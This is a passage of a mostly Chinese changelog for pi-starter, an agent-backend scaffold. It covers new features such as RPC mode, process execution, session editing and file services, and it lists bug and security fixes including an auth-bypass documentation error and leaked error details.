  - **官方 RPC 模式**：`src/rpc.ts` + `npm run dev -- --mode rpc`，经 `createAgentSessionRuntime` + `runRpcMode` 把 pi-starter 作为 stdio JSONL agent 后端驱动；与 `buildAgent` 共享同一装配核心（抽出的 `resourceLoaderOptions`），RPC 与 REST/WS 不在隔离/人设/工具上分叉。RPC 为单会话入口，不携 MCP 桥 / HTTP 审批闸门。
  - `.env.example` 新增 `PI_SCOPED_MODELS`；`lib.ts` 导出 `startRpcMode`/`resolveScopedModels`/`parseScopedModelRefs` 等。
  - **更多低成本官方项一等化**：`buildAgent({ commands })` 直接走官方 `pi.registerCommand`（代码型斜杠命令，handler ctx 带 `sendUserMessage`/`waitForIdle`）；`buildAgent({ excludeTools })` 接官方 `excludeTools` 黑名单；`BuiltAgent.waitForIdle()`/`getThinkingLevel()` 对应 `session.agent.waitForIdle`/`session.thinkingLevel`；`cycleModel(direction)` 支持官方反向。
- **对齐官方 Pi SDK：手写实现切回官方机制**（优先用官方/核心实现）。
  - **技能目录去重**：`buildSystemPrompt` 在 `systemPromptOverride` 路径下、只要工具集含 `read`，就会自动追加 SDK 原生 `<available_skills>`（`formatSkillsForPrompt`）；而 `agent.ts` 又用自定义 `formatSkillCatalog` 往 `{{skills}}` 层塞了第二份——系统提示词里实际有两份技能清单。现在删掉自定义目录，只依赖 SDK 那一份。`{{skills}}` 从默认拼接顺序移除，但仍是**已知** token（渲染为空），旧模板写它不会报错也不会漏字面量。
  - **提示词模板清单走官方 `loader.getPrompts()`**：不再自行解析 frontmatter（`loadPromptTemplates` 不在包主入口导出），改用 `DefaultResourceLoader.getPrompts()` 从一个只加载模板的最小装载器拿回 `PromptTemplate[]`。`/skills` 与 `/prompt-templates` 的清单都源自装载器，与系统提示词/斜杠展开不可能漂移。
- **`navigateTree` 带摘要（回退走官方树导航）**：`rollback_conversation` 新增可选 `summarize` / `instructions`；`summarize` 为真且 SDK 提供 `navigateTree` 时走官方（对被丢掉的后半段生成分支摘要，`customInstructions` 说"该保留什么"），否则回落到原先 `branch()` + custom 标记。缺方法时不崩。
- **`prompt()` 预检可见**：REST `/chat` 与 WS `prompt` 传 `preflightResult`，被预检拒（false）时回明确 `conflict`，不再静默空流。
- **`queue_update` 即时快照**：队列变化时立刻 `getState()`，客户端不必等下一个增量就着到 steering/followUp 队列。
- **JSON 事件流通道**：`POST /chat?format=jsonl`（官方 `json.md` 事件词表）把原始 SDK 事件逐行 NDJSON 输出，首行 `{"type":"session",...}`。默认关，不动现有 SSE 契约；继 loopback + 加固。
- **自定义 provider 示例**：`src/extensions/custom-provider.example.ts` 演示官方 `pi.registerProvider`（api-key 型）；默认不接线，经 `buildAgent({ extraExtensions })` 传入。交互式 OAuth 属 TUI，无头后端明确**不适用**。
- **提示词模板接入官方 SDK 能力**：`src/prompt-templates/` 模块此前已仿技能层写好（`resolvePromptTemplatePaths` / `loadScaffoldPromptTemplates` + 内置示例 `review.md`），但从未被 `buildAgent` 引用，属于"官方提供、脚手架必要、半成品未接线"的缺口。现在按 skills/knowledge 的模式接入：`buildAgent({ extraPromptTemplatePaths, builtinPromptTemplates })` 把模板交给 SDK `DefaultResourceLoader.additionalPromptTemplatePaths`，`session.prompt("/name")` 自动展开（`$1` / `$@` / `${1:-x}` / 切片）；新增 `GET /prompt-templates` 与 `/prompt-templates/:name`，`/info` 与 WS `capabilities` 一并列出模板目录；`BuiltAgent` 新增 `promptTemplates` 字段；`lib.ts` 导出供嵌入方使用；`dist-assets.cjs` 把 `prompt-templates/*.md` 拷进 `dist/`。配套 4 项单测 + HTTP 路由断言，已并入 `npm test`。（清单最初是自行解析 frontmatter，随后一条 Added 条目把它改成了官方 `loader.getPrompts()`。）
- **会话编辑**：`rename_conversation` / `rollback_conversation` / `edit_message` / `fork_conversation`。调用 SDK 的会话树，不另写存储。回退和编辑会追加一条不进模型上下文的 `pi-starter.tree` 标记，重启后叶子不会回到被丢掉的后半段。编辑把原文经 `edit_ready` 交回，不自动再发一轮。分叉用一次性打开的 `SessionManager`，不改正在对话的那个会话的 id。没打开的对话可以改名，不能回退或编辑。客户端只传会话 id 和记录 id。
- **进程执行**（仅 `PI_BUILTIN_TOOLS=coding`）：`exec` / `exec_jobs` / `exec_stop`。前台等到退出或超时，后台立刻返回 id，可列出、读已捕获输出、停止。超时和中止杀掉进程树。工作目录先做字面路径检查，再 `realpath`，解析失败即拒绝。Windows 用 cmd.exe，其它平台用 `/bin/sh`，不依赖 Git Bash。不是交互式 PTY（没有 vim / top，没有终端尺寸）。`off` / `readonly` 不挂这些工具；审批里原先只匹配 `bash` 的内置高危规则同时匹配 `exec`；计划模式拒绝 `exec` / `exec_stop`，放行只读的 `exec_jobs`。
- **真端到端测试**（`npm run e2e`，已并入 CI）：起**真实 server 进程** → 跑一次真实对话 → `SIGKILL` → 重启 → 验证会话从磁盘恢复 → 恢复后还能继续对话；**恢复后带工具调用**（假 LLM 发 `ls` 工具调用 → 真执行 → 重启恢复 → 断言出站请求里每个 `tool_call` 都有对应 tool 结果、且无孤立结果——这正是真实 provider 会校验的配对，断了会报「消息格式非法」而极难反推）；索引指向已删文件时不出现幽灵条目、陈旧 id 明确报错。不需要真实 API Key：把 `PI_CODING_AGENT_DIR` 指向临时目录并写一份指向本地假 OpenAI 兼容端点的 `models.json`，启动期不联网探测。此前 `resume.test.ts` 只在同进程里重读一遍索引，**从未真重启过**——而落盘时机、会话目录推导、索引与 jsonl 的对应关系，同进程测试全都测不到。
- **上下文主动压缩**：WS `compact_context { instructions? }` + `POST /context/compact`（REST 侧汇总所有连接，串行执行并报出每个结果）。此前只有 SDK 自动触发时的被动 notice，客户端看得见压缩发生了却无法主动发起，而「该保留什么」只有用户知道。三条前置条件都给出**明确中文理由**而非静默无效：正在流式 / 上下文太小（低于 `MIN_COMPACTABLE_TOKENS`，压了也省不下什么）/ SDK 不支持。压缩后**作废投影与 token 缓存**——若SDK 原地改写消息对象，WeakMap 键不变会命中压缩前的值，快照会继续显示被压掉的旧内容。
- **后端体系加固（两轮）**：工具看门狗、慢客户端断连、类型化错误 `AppError`、速率限制、结构化脱敏日志、指标端点、审批规则引擎（六种匹配器 + 编辑接口）、未使用符号门禁、CI 六道关卡。
- **扩展点体系**：WS 自定义命令（`attachWebSocket(server, { commands })`，未注册命令明确报错、内置不可被覆盖）、HTTP `configure` 钩子与 `seal()`、`addDisposer()` 统一回收。业务逻辑不碰内核即可接入。
- **文件服务**：`/files/*` 全套（浏览 / 读 / 写 / 新建 / 重命名 / 复制 / 删除 / Range 原始内容 / base64 上传）。路径穿越与**符号链接逃逸均 fail-closed**。
- **持久化**：会话、设置、审批规则三处落盘（原子写 + 损坏回落）。规则**改动即写盘**——唯一写盘时机是「我们自己改动时」，因此停机不再写盘，运行期间用户手改规则文件不会被停机覆盖。会话重启后可恢复，只恢复本工作区、不做跨客户端过户。
- **通用能力补齐**：MCP 桥（stdio 子进程 + 配置热生效）、计划模式（会话级只规划不实施）、子代理（不占主对话 LRU 额度）、多把 API 密钥（原始值永不出服务端）、`turn_start` / `turn_end` 轮次信号。
- **测试基础设施**：集成测试层用遵守 SDK 契约的 session 替身驱动真实编排栈（不依赖网络与 API Key，CI 可跑）；`listenTestServer()` 接住端口错误并重试、强制断开 keep-alive 连接；`waitFor(条件)` 取代固定 sleep，消除全量并发下的偶发失败。
- **嵌入路径**：[`docs/嵌入指南.md`](docs/嵌入指南.md) —— 已有 Express 服务的两条路线、鉴权挂法、可重复执行的自检清单。
- **关闭内置示例内容**：`buildAgent({ builtinKnowledge: false, builtinSkills: false })`（底层为 `loadScaffoldKnowledge` / `resolveSkillPaths` 的 `includeBuiltin`）。此前 `extraKnowledgeDirs` / `extraSkillPaths` 只叠加、内置同名优先，业务方**没有任何办法**把 `about.md` 与 `summarize` 技能从系统提示词里去掉。
- **嵌入自检**：`npm run verify:embed`（已并入 `npm run verify`），打 `dist/` 跑 8 项断言，覆盖内置示例内容的开关、`createApp` 返回值形状、内核路由可用性，以及鉴权中间件三种挂载位置的实测对比。

### Fixed

- **优雅停机的兜底定时器位置是错的（会导致进程永久挂死）**：`shutdown()` 把 `gate.dispose()` / `ws.close()` / `hub.dispose()` / `dispose()` 全部排在 `setTimeout(bail)` **之前**。任何一步抛错，`shutdown()` 就 reject，而信号处理器是 `void shutdown()` —— 变成未捕获拒绝，兜底定时器压根没建、`server.close()` 永不调用，**进程挂死只能等 SIGKILL**。也就是说这个「硬退出兜底」恰好保护不了最可能发生的失败。拆解逻辑抽到 `src/graceful.ts`：兜底**先建**、每步单独 try/catch（一步失败不影响其余）、关闭与兜底**竞速**（原来直接 `await closeServer()`，socket 拒绝关闭时本函数永不 resolve——这条坑实际踩到过，测试挂死并堆出孤儿进程）。新增 6 项单测，且做反向验证。
- **停机时打印的是请求端口而非实际绑定端口**：`--port 0`（让 OS 分配，E2E 与容器调度常用）会记出 `ws://127.0.0.1:0/ws`——调用方无法得知真实端口。改为读 `server.address().port`。这也顺带消除了 E2E 的端口竞态：旧做法是「探一个空闲端口→关掉→传给子进程」，探测与真正 listen 之间有窗口，CI 并行时表现为偶发 `EADDRINUSE`（本轮实际撞到）。
- **`POST /chat` 流式失败泄漏内部细节且不记日志**：状态码已提交，`errorHandler` 再也看不到这个异常，于是 `err.message` 原样写进 SSE——数据库绝对路径、SQL、SDK 内部信息全都会到客户端。实测反向验证时确实返回了 `unable to open C:\Users\real\private\db.sqlite 密码 hunter2`。改为复用 `toAppError`：`internal` 只回通用文案 + `code`，面向调用方的码（如 `read_only_sql`）照常放行以便模型自我纠正；同时**补上服务端 error 级日志**，此前失败在服务端完全不可见。此前该路径零测试覆盖。
- **E2E 里「不是兜底强退」的断言是假阳性**：它在停机 handler 根本没运行时也通过（因为没有超时日志只是因为压根没停机）。现在加了前提，且 Windows 上因 Node 不投递可捕获的 SIGTERM 而**显式报告 SKIP 与原因**，不再冒充通过。
- **E2E 里「停机后端口已释放」是单次瞬时判定**（竞态）：进程刚退出时 listener 可能还没被 OS 收走，多次通过后偶发变红。改为轮询判定——真泄漏时 10s 后依然会红，不是在掩盖问题。
- **E2E 用正则从日志里抓 `"knowledge":["about"]` 判断示例内容是否加载**：耦合的是日志排版，格式一改断言就假红。改为调用 `/capabilities`（文档化契约，且数据源正是写进系统提示词的那份清单）。
- **三个依赖漏洞清零**（`npm audit` 从high 降为 0）：`brace-expansion` 5.0.7 → 5.0.12、`undici` 8.5.0 → 8.11.2、`proxy-addr` 2.0.7 → 2.0.8。前两者位于 `@earendil-works/pi-coding-agent` 的**嵌套依赖**里，顶层 override 不生效——必须删除 lockfile 让 npm 从零解析才会应用（`npm install` 与 `--package-lock-only` 都会因「lockfile 已满足」而跳过重算）。
- **`package.json` 自依赖**（`"pi-starter": "file:pi-starter-0.1.0.tgz"`）会让 CI 的 `npm ci` 直接失败（该 tarball尚未构建）。已移除。
- **符号链接逃逸测试在 Windows 上从未真正运行**：两个用例在 `symlinkSync` 抛 `EPERM`（未开开发者模式）时直接 `return`，看着通过、实际没跑——比显式 skip 更糟。改用 **junction**（NTFS reparse point，普通用户即可创建，且 `realpath` 同样穿过它），两个用例现在在 Windows 上真跑，并加了「这个链接确实指向根外」的前提断言。
- **设置校验报错缺字段名**：`PATCH /settings` 传错类型只得到 `Expected boolean, got string`，同时改多个字段时无从定位是哪个。`patch()` 与启动读盘的 `normalize()` 现在都统一补上 `字段名: 原因`。
- 文档给出的鉴权建议**无效且危险**：README（中英双版）写的是「在 `createApp()` 外面加中间件」，实测中间件排在内核路由之后，`/chat`、`/model`、`/skills` 全部绕过鉴权直接返回 200——等于把 Agent 端点无鉴权暴露。正确写法是把内核 app 作为子应用挂到父应用上（`server.use("/agent", auth, agentApp)`），已同步 README、`SECURITY.md`、`FAQ.md` 与嵌入指南。
- 安全边界描述与实现相反：README / `SECURITY.md` / `FAQ.md` 称 HTTP 服务「默认监听所有网卡」，实际 `RUNTIME_DEFAULTS.host` 是 `127.0.0.1`（回环），仅当 `PI_HOST` 设为非回环地址时才对外监听，且启动会告警。

- 业务方经 HTTP 注入的路由此前落在错误处理器之后，抛出的 `AppError` 不会被翻译——实测会把密码、绝对路径与源码行号原样返回客户端。
- 审批规则的 `match.value` 未校验：缺 `value` 的 `glob` 在**匹配时**崩溃，缺 `value` 的 `regex` 会静默匹配字面量 `"undefined"`。
- 文件服务的符号链接校验在 `realpath` 失败时**放行**（fail-open），现改为拒绝。
- 配置文件能解析但含未知字段或非法值时，`SettingsService` 构造抛错导致**服务起不来**；现剔除该字段并告警（API 路径仍严格拒绝未知字段）。
- 会话索引无容量上限且每次写入重新读回文件；现上限 500、按 `updatedAt` 淘汰最旧。
- 模型切换后 `/info` 与 `/health/ready` 报告**已不再使用的模型**（WS 切模型路径绕过所致）；现每请求读 live getter。
- 轮次结束不发权威信号：补 `run_end`（含 `stopReason` / `willRetry` / `aborted`）与 `tool_delta`。
- 子代理在排队或建会话期间收到的 abort 会被漏掉，导致用户已停手而子代理继续消耗 token。
- MCP 子进程启动失败时 Node 只发 `error` 不发 `exit`，造成未捕获异常与永久挂起。

### Open-source metadata

- **Open-source metadata** in `package.json`: `author`, `license: MIT`, `homepage`, `repository`, `bugs`, `keywords`, `main`, `types`, `files`; removed `private: true` so the package can be published or consumed as a library.
- **Bilingual README layout**: `README.md` is now the English main version; `README.zh-CN.md` is added as the Chinese companion. Both start with a language-switch line and share the same section structure.
- **Badges + repo URL** at the top of both READMEs (release, license, Node engine, CI status, issues, last commit, PRs welcome).
- **Architecture section** in both READMEs, referencing the two generated SVGs:
  - `docs/architecture.svg` — layered stack diagram (entry / assembly / business resources / HTTP+SSE / runtime+config).
  - `docs/sse-protocol.svg` — `POST /chat` sequence diagram with the live SSE event vocabulary and tool-result preview limit.
- **Diagram generators** under `scripts/visualization/`, Node built-ins only, all counts and names parsed from source:
  - `generate_architecture.mjs` reads `package.json`, `src/tools/*.ts`, `src/skills/*/SKILL.md`, `src/knowledge/*.md`, `src/extensions/index.ts`, `src/app.ts`, `src/sse.ts`, and every `src/**/*.test.ts`.
  - `generate_request_flow.mjs` parses `src/sse.ts` (event names, `TOOL_RESULT_PREVIEW_LIMIT`) and `src/app.ts` (SSE frames emitted outside the translator).
  - `README.md` documents the run command and single-source-of-truth rules.
- **Tech stack table** in both READMEs, sourced directly from `package.json`.
- **Standard OSS files**: `CONTRIBUTING.md`, `SECURITY.md`, `FAQ.md`, `AUTHORS`, `.gitattributes` (LF-normalised text, binary whitelist, `linguist-generated` for `package-lock.json` and `dist/**`), `.github/workflows/ci.yml` (matrix: ubuntu / windows / macos × Node 22.19 / 22.x / 24.x, runs typecheck + test + build, uploads `dist/` artifact).

### Changed

- **LICENSE** copyright holder updated to `LPK3215` (matches `git config user.name`).
- **README** project structure tree extended to show `docs/`, `scripts/visualization/`, and `.github/workflows/`.
- **.gitignore** supplemented with local env variants, SQLite artifacts, TypeScript / test caches, IDE folders, and OS junk files.

### Fixed

- Replaced broken internal reference to a private local tutorial path in the previous `README.md` with a link to the upstream [pi repository](https://github.com/earendil-works/pi).

## [0.1.0] - 2026-10-08

Initial public scaffold release.

### Added

- **Assembly layer** (`src/agent.ts`): combines model, layered prompts, tools, and extensions into a runnable agent session.
- **Config layer** (`src/config.ts`, `src/cli-args.ts`): CLI flag > `.env` > default resolution for provider, model, model catalog (`PI_MODELS`), API keys, built-in-tool tier (`PI_BUILTIN_TOOLS`), and database path.
- **Dual entry points**:
  - CLI (`src/index.ts`, `npm run dev`) with `/models` and `/model <id>` slash commands.
  - HTTP + SSE server (`src/server.ts` + `src/app.ts` + `src/sse.ts`, `npm run web`) exposing `/health`, `/skills`, `/skills/:name`, `/knowledge`, `/knowledge/search`, `/knowledge/:name`, `/db`, `/db/notes`, `/db/query`, `/model`, `/chat`.
- **Layered prompts**: `src/prompts/persona.md` and `src/prompts/rules.md` compose the system prompt.
- **Tool layer** with pluggable registration (`src/tools/index.ts`): built-in example `current_time`, plus `search_knowledge` / `read_knowledge` and `db_status` / `db_query`.
- **Skills** (`src/skills/`): `<name>/SKILL.md` loaded through the SDK's `DefaultResourceLoader.additionalSkillPaths`; the sample `summarize` skill ships with the repo.
- **Knowledge base** (`src/knowledge/`): scan-and-search Markdown store (SDK has no native knowledge base); `about.md` example included.
- **Database** (`src/db/`): Node 22 `node:sqlite` with an in-memory default, sample `notes` rows seeded at startup, `GET /db` liveness, and read-only `db_query`.
- **Extensions** (`src/extensions/`): `guard` (pre-execution interception of dangerous bash and paths escaping cwd, `read SKILL.md` excepted) and `audit` (per-tool timing logs).
- **One-command Pi setup** (`npm run setup`): merge-writes `~/.pi/agent/models.json` and `auth.json` (mode `0o600`) from `.env`; `--force` opts into overwriting existing keys.
- **Model catalog & runtime switching**: `PI_MODELS` supports multiple providers; switch models via `--model`, CLI `/model`, or `POST /model` without rebuilding the session.
- **Built-in-tool tiers**: `off` (default, custom tools + `read` for skills), `readonly` (adds `grep` / `find` / `ls`), `coding` (adds `bash` / `edit` / `write`). Local `~/.pi/agent/skills` and `~/.pi/agent/extensions` are not scanned by default.
- **Library export** (`src/lib.ts`): `import { buildAgent, createApp } from "pi-starter"` with `extraTools`, `extraExtensions`, `extraSkillPaths`, `extraKnowledgeDirs`, `database`, `databasePath`, `inMemory`, `staticDir` options.
- **Contract smoke tests** (`*.test.ts` under `src/`): run offline; do not call models or write to the real `~/.pi/agent/`.
- **Sample chat page** (`public/index.html`): local-only reference UI for trying the HTTP/SSE endpoints.
- **Build pipeline** (`npm run build`, `scripts/dist-assets.cjs`): compiles TypeScript to `dist/` and copies prompt / skill / knowledge assets alongside the emitted JS.

[Unreleased]: https://github.com/LPK3215/pi-starter/compare/v0.3.0...HEAD
[0.3.0]: https://github.com/LPK3215/pi-starter/releases/tag/v0.3.0
[0.2.0]: https://github.com/LPK3215/pi-starter/releases/tag/v0.2.0
[0.1.0]: https://github.com/LPK3215/pi-starter/releases/tag/v0.1.0
